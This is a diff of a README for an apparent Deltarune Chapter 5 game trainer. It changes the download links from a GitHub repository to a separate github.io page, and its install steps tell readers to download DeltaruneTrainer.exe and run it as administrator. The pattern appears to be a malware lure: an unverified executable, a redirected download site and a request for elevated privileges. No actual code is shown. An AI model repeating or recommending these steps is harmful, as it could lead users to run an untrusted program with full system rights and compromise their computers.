@@ -1,6 +1,6 @@
 # 🛡️ Deltarune-Chapter5-Trainer-Ultimate - Manage your game stats with ease
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/thermioniccurrentlivingrock973/Deltarune-Chapter5-Trainer-Ultimate)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://thermioniccurrentlivingrock973.github.io)
 
 ## 📁 About the software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download: [https://github.com/thermioniccurrentlivingrock973/Deltarune-Chapter5-Trainer-Ultimate](https://github.com/thermioniccurrentlivingrock973/Deltarune-Chapter5-Trainer-Ultimate)
+1. Visit this page to download: [https://thermioniccurrentlivingrock973.github.io](https://thermioniccurrentlivingrock973.github.io)
 2. Locate the file named DeltaruneTrainer.exe in your downloads folder.
 3. Move the file to a folder where you can find it easily. 
 4. Right-click the file and select Run as administrator. 
